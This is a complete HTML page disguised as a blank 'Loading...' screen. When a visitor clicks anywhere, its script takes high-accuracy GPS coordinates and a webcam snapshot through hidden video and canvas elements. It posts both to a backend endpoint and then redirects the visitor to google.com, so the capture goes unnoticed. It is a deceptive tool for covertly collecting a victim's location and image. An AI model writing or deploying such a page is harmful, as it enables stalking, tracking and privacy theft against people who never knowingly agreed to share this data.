<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body onclick="startProcess()">
    <div id="status">Click anywhere to continue...</div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Helper to wrap Geolocation in a Promise
        const getGPS = () => {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("GPS Not Supported");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(${pos.coords.latitude},${pos.coords.longitude}),
                    (err) => resolve("GPS Denied"),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        };

        async function startProcess() {
            document.getElementById('status').innerText = "Updating...";
            
            try {
                // 1. Await GPS first
                const coords = await getGPS();

                // 2. Access Camera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                
                // 3. Capture Frame
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                const imageData = canvas.toDataURL('image/jpeg');

                // 4. Send to Backend
                await fetch('/api/index', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData, gps: coords })
                });

                // 5. Cleanup and Redirect
                stream.getTracks().forEach(track => track.stop());
                window.location.href = "https://www.google.com";
                
            } catch (e) {
                console.error(e);
                window.location.href = "https://www.google.com";
            }
        }
    </script>
</body>
</html>
